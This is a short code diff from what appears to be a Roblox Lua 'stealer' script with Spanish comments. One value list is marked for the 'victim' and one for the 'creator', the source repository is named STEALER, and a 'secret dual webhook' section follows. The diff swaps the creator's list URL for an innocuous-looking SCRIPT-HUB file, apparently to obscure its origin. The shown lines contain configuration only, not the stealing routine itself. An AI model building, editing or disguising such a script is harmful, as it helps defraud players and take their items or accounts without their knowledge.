@@ -10,7 +10,7 @@ local player = Players.LocalPlayer
 -- URLS DE LOS REPOSITORIOS DE VALORES (JSON)
 -- ==========================================
 local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json" -- Lista para el Usuario (Víctima)
-local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values_dual.json" -- Lista para el Creador (Tú)
+local VALUES_REPO_URL_DUAL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json" -- Lista para el Creador (Tú)
 
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK Y OBJETIVOS
